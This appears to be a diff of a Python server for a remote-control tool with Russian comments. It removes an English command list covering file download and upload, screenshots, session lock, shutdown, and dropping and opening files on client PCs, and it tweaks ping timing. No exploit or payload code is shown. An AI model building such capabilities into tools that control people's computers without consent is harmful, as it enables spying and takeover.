@@ -4,8 +4,6 @@ import asyncio
 from time import sleep
 
 import logging
-
-from bs4 import Tag
 logger = logging.getLogger('logger')
 
 logger.setLevel(logging.DEBUG)
@@ -26,19 +24,6 @@ class Notificator:
 
 
 # Список команд с описанием, в виде 2д массива
-commands_en = [
-    ["exit", "Exits the connection on both sides"],
-    ["cd", "Changes the active directory with one arg"],
-    ["download", "Downloads files from the client"],
-    ["upload", "Uploads files from the server to the client"],
-    ["message", "Shows a message box on the client users screen"],
-    ["lock", "Puts the client user back to the login screen"],
-    ["shutdown", "Shutsdown the client PC"],
-    ["restart", "Restarts the client PC"],
-    ["screen", "makes screenshot"],
-    ["drop", "uploads file to client pc and opep it"],
-    ["clires", "restarts client script"],
-]
 
 commands = [
     ["exit", "Закрывает соединение с клиентом"],
@@ -193,7 +178,7 @@ class ManyServers:
         """Проверка подключенных клиентов"""
         while True:
             res = asyncio.run(self.make_command_to_server("all ping"))
-            sleep(5)
+            sleep(15)
     
     def __connection_monitor(self):
         """Мониторинг новых подключений, если появляется запрос от нового клиента, принимает его"""
@@ -251,7 +236,6 @@ class Server:
                 self.in_process = False
                 return str(time.time() - start_ping_time)
             elif command[0] == "clires":
-                self.in_process = False
                 return "Клиент отключен -_-"
         except Exception as err:
             logger.debug(f"execution error: \n {err}")
